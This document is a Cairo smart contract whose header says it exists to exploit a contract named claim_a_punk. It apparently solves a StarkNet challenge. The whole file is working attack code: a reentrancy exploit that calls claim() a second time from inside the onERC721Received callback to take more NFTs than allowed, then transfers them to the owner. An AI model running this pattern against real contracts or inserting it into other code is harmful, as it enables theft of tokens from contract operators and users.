// SPDX-License-Identifier: MIT

// @author Gershon Ballas <gershon@gingerlabs.xyz>

// This contract is used for exploiting claim_a_punk.cairo

// Compilation command:
// starknet-compile --debug_info_with_source ./exploit.cairo > ./exploit.compiled.cairo

%lang starknet
%builtins pedersen range_check

from starkware.cairo.common.cairo_builtins import HashBuiltin
from starkware.cairo.common.uint256 import Uint256
from starkware.cairo.common.math import assert_not_zero
from starkware.starknet.common.syscalls import get_contract_address
from starkware.cairo.common.math_cmp import is_le

const TRUE = 1;
const FALSE = 0;
const IERC721_RECEIVER_ID = 0x150b7a02;

@contract_interface
namespace ClaimAPunk {
    func claim(to: felt) {
    }
}

@contract_interface
namespace IERC721Enumerable {
    func balanceOf(owner: felt) -> (balance: Uint256) {
    }

    func tokenOfOwnerByIndex(owner: felt, index: Uint256) -> (tokenId: Uint256) {
    }

    func transferFrom(from_: felt, to: felt, tokenId: Uint256) {
    }
}

// Address of owner
@storage_var
func _owner_address() -> (address: felt) {
}

// Claim-a-Punk contract address
@storage_var
func _claim_a_punk_address() -> (address: felt) {
}

// NFT contract representing punks
@storage_var
func _punks_nft_address() -> (address: felt) {
}

@constructor
func constructor{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(
    owner_address: felt, claim_a_punk_address: felt, punks_nft_address: felt
) {
    // Save owner address
    _owner_address.write(owner_address);

    // Save claim-a-punk address
    _claim_a_punk_address.write(claim_a_punk_address);

    // Save punks NFT address
    _punks_nft_address.write(punks_nft_address);

    return ();
}

@external
func exploit{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}() {
    // Call claim-a-punk's claim() with this contract as the receiver
    let (this_contract_address) = get_contract_address();
    let (claim_a_punk_address) = _claim_a_punk_address.read();
    ClaimAPunk.claim(contract_address=claim_a_punk_address, to=this_contract_address);

    // Get token ID's of NFT's owned by this contract
    let (nft_address) = _punks_nft_address.read();
    let (first_nft_token_id) = IERC721Enumerable.tokenOfOwnerByIndex(
        nft_address, this_contract_address, Uint256(0, 0)
    );
    let (second_nft_token_id) = IERC721Enumerable.tokenOfOwnerByIndex(
        nft_address, this_contract_address, Uint256(1, 0)
    );

    // Transfer them back to the user
    let (owner_address) = _owner_address.read();
    IERC721Enumerable.transferFrom(
        nft_address, this_contract_address, owner_address, first_nft_token_id
    );
    IERC721Enumerable.transferFrom(
        nft_address, this_contract_address, owner_address, second_nft_token_id
    );

    return ();
}

@external
func onERC721Received{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(
    operator: felt, from_: felt, tokenId: Uint256, data_len: felt, data: felt*
) -> (selector: felt) {
    // We only want to claim 2 NFT's - make sure we don't already have that
    let (punks_nft_address) = _punks_nft_address.read();
    let (this_contract_address) = get_contract_address();
    let (balance) = IERC721Enumerable.balanceOf(
        contract_address=punks_nft_address, owner=this_contract_address
    );

    // same as `if (balance > 1)`
    let is_balance_le_1 = is_le(balance.low, 1);
    if (is_balance_le_1 == FALSE) {
        return (selector=IERC721_RECEIVER_ID);
    }

    // Call claim-a-punk's claim() again
    let (claim_a_punk_address) = _claim_a_punk_address.read();
    ClaimAPunk.claim(contract_address=claim_a_punk_address, to=this_contract_address);

    // Return required selector
    return (selector=IERC721_RECEIVER_ID);
}

// Have to implement ERC165 in order to get onERC721Receive() called
@external
func supportsInterface{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(
    interfaceId: felt
) -> (success: felt) {
    return (success=TRUE);
}
